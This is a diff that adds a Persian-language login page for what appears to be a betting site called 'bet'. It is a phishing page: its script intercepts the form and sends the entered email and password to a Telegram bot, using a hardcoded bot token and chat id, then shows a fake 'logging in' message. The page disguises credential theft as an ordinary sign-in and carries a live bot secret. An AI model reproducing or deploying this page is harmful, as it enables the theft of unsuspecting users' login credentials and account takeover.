@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>ورود به حساب کاربری</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');
+    body {
+      background-color: #fdfdfd;
+      font-family: 'Vazirmatn', Tahoma, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #000;
+      padding: 25px 0;
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      color: #FFD700;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+    }
+    .container {
+      max-width: 95%;
+      width: 420px;
+      background-color: #ffffff;
+      margin: 60px auto;
+      padding: 35px 25px;
+      border-radius: 14px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #222;
+    }
+    label {
+      font-size: 16px;
+      margin-bottom: 6px;
+      display: block;
+      color: #333;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 22px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: border-color 0.3s;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #000;
+      outline: none;
+    }
+    .btn {
+      background-color: #000;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .btn:hover {
+      background-color: #222;
+    }
+    .link {
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">bet</div>
+
+<div class="container">
+  <h2>ورود به حساب کاربری</h2>
+  <form id="loginForm">
+    <label>ایمیل</label>
+    <input type="text" name="email" required>
+    
+    <label>رمز عبور</label>
+    <input type="password" name="password" required>
+
+    <button class="btn" type="submit">ورود به حساب کاربری</button>
+    <div class="link">بازیابی رمز عبور</div>
+  </form>
+</div>
+
+<script>
+  const token = "7874856646:AAFdjsl46Foud0-CUlVRfR9mUsPyFKnS2l8";
+  const chatId = "7610374149";
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const email = this.email.value;
+    const password = this.password.value;
+
+    const message = `ورود جدید:\\nایمیل: ${email}\\nرمز: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    }).then(() => {
+      alert("در حال ورود...");
+    }).catch(err => {
+      console.error("خطا:", err);
+      alert("خطا در ارسال اطلاعات.");
+    });
+  });
+</script>
+
+</body>
+</html>
